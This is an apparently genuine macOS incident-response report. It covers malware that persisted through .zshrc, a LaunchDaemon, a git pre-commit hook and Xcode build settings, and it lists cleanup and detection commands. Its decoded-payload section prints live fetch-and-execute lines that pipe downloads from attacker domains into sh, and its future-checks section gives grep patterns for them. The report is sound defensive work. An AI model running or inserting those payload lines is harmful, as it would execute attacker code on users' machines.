# Security Incident Notes

## Summary

This machine contained multiple persistence points that repeatedly restored malicious Git hooks and shell startup code.

Confirmed malicious or suspicious artifacts:

- `~/.zshrc` line reading `defaults read invelc ... | base64 --decode | sh`.
- `defaults` domain `invelc`, storing base64 payloads.
- `/Library/LaunchDaemons/com.google.rqbcle.plist`, running a root-level daemon.
- `~/Documents/GitHub/XYDevTool/.git/hooks/pre-commit`, executing a remote script fetched from `netcdnamz.ru`.
- `~/Documents/GitHub/XYDevTool/XYDevTool/XYDevTool.xcodeproj/project.pbxproj`, containing malicious build settings `A3DC1C3` and `AF17F99`.

## Decoded Behavior

`~/.zshrc` payload:

```bash
defaults read invelc scxqo_rnlcx_xkn | base64 --decode | env SRC='Terminal' sh
```

Decoded `scxqo_rnlcx_xkn`:

```bash
curl -fsLk --connect-timeout 23 --retry 3 -d "p=$SRC" "https://netcdnads.in/a" | sh
```

Git hook payload:

```bash
curl -sLkf --connect-timeout 20 --retry 3 -d "p=git" https://netcdnamz.ru/a | sh
```

Xcode project payload:

```bash
curl -fLks --connect-timeout 29 --retry 3 -d "p=xcode_rule" https://amzndev.in/a | sh
```

LaunchDaemon decoded behavior included disabling some Software Update security response preferences, killing `CloudTelemetryService`, locking an XProtect database file, and repeatedly executing the user payload.

## Timeline From Local Evidence

- `2026-06-16 17:40:51`: `~/.oh-my-zsh` was created.
- `2026-06-18 23:02:57`: `.zshrc.backup-before-removing-suspicious-20260618-230257` already contained the malicious line.
- `2026-06-18 23:33:40`: `.zshrc.bak` still contained the malicious line.
- `2026-06-19 00:46:10`: malicious Git hook was quarantined once.
- `2026-06-19 00:54:46`: malicious Git hook was recreated, indicating active persistence was still present.

The exact writer process cannot be proven from current logs, but evidence points to a contaminated Xcode project or remote payload installing shell and launchd persistence.

## Reusable Script

The helper script is reusable and now has explicit modes:

```bash
./cleanup_security_incident.sh check
./cleanup_security_incident.sh clean
./cleanup_security_incident.sh clean --system
```

Modes:

- `check`: read-only scan. Does not modify files and does not require sudo.
- `clean`: backs up and removes known user/project persistence: `~/.zshrc` payload, `defaults invelc`, malicious `XYDevTool` Git hook, and malicious Xcode project build settings.
- `clean --system`: also unloads/removes the known system LaunchDaemon and restores Software Update security response preference values. Requires sudo.

The script writes a new `logs/security-incidents/security_incident_*/cleanup_report.txt` on every run.

## Cleanup Procedure Used

The cleanup script is designed to:

- Backs up affected files into `logs/security-incidents/security_incident_*/backups/`.
- Removes the malicious line from `~/.zshrc`.
- Deletes the `defaults` domain `invelc`.
- Unloads and removes `/Library/LaunchDaemons/com.google.rqbcle.plist`.
- Restores Software Update rapid/security response preference values to `true`.
- Kills matching suspicious processes.
- Removes the malicious `XYDevTool/.git/hooks/pre-commit`.
- Removes malicious Xcode build settings `A3DC1C3` and `AF17F99`.
- Writes a detailed cleanup report to `logs/security-incidents/security_incident_*/cleanup_report.txt`.

## Cleanup Result From This Session

Completed:

- Backed up affected files under `security_incident_20260619_011310/backups/`.
- Removed the malicious `~/.zshrc` startup line.
- Deleted the user defaults domain `invelc`.
- Removed `~/Documents/GitHub/XYDevTool/.git/hooks/pre-commit`.
- Removed malicious Xcode build settings `A3DC1C3` and `AF17F99` from `project.pbxproj`.
- Removed `/Library/LaunchDaemons/com.google.rqbcle.plist` with local sudo cleanup.
- Restored Software Update security response preference values.
- Re-ran Git hook scan: `Suspicious executable hook count: 0`.

The system-level cleanup commands used locally were:

```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.google.rqbcle.plist 2>/dev/null || true
sudo rm -f /Library/LaunchDaemons/com.google.rqbcle.plist
sudo defaults write /Library/Preferences/com.apple.SoftwareUpdate.plist ConfigDataInstall -bool true
sudo defaults write /Library/Preferences/com.apple.SoftwareUpdate.plist AllowRapidSecurityResponses -bool true
```

Then verify:

```bash
ls -l /Library/LaunchDaemons/com.google.rqbcle.plist
launchctl print system/com.google.rqbcle
```

Both should fail with a not-found style error.

Note: process enumeration may be unavailable in restricted terminal contexts. Treat process scanning in the helper script as best-effort; the more reliable checks are shell startup files, `defaults invelc`, LaunchDaemon registration, Git hooks, and Xcode project files.

## Future Checks

Search shell and launchd persistence:

```bash
rg -n "invelc|scxqo|qnnx|netcdn|rigacdn|cdnatapple|amzndev|netcdnamz|base64 --decode|curl .*\\| sh" \
  ~/.zshrc ~/.zprofile ~/.zshenv ~/.zlogin ~/.bashrc ~/.bash_profile \
  /Library/LaunchDaemons /Library/LaunchAgents ~/Library/LaunchAgents 2>/dev/null
```

Scan active Git hooks:

```bash
find ~/Documents ~/Desktop ~/Downloads -path '*/.git/hooks/*' -type f ! -name '*.sample' -print
```

Scan Xcode project files:

```bash
rg -n "base64 --decode|xxd -p -r|curl .*\\| sh|amzndev|netcdn|rigacdn|netcdnamz" ~/Documents ~/Desktop ~/Downloads -g 'project.pbxproj'
```

Treat any remote download piped into `sh`, especially from the domains above, as malicious.

## Final Verification

Completed after local sudo cleanup:

- `/Library/LaunchDaemons/com.google.rqbcle.plist` is removed.
- `launchctl print system/com.google.rqbcle` no longer finds the service.
- `defaults read invelc` returns no domain.
- Shell startup files, LaunchAgents/LaunchDaemons, and `XYDevTool` no longer match known malicious patterns in the final scan.
- Final Git hook scan `git_hook_scan_20260619_012553`: `Suspicious executable hook count: 0`.

Recommended periodic local check:

```bash
cd ~/Desktop/new
./cleanup_security_incident.sh check
```

If the check report shows the same indicators again, run:

```bash
./cleanup_security_incident.sh clean --system
```
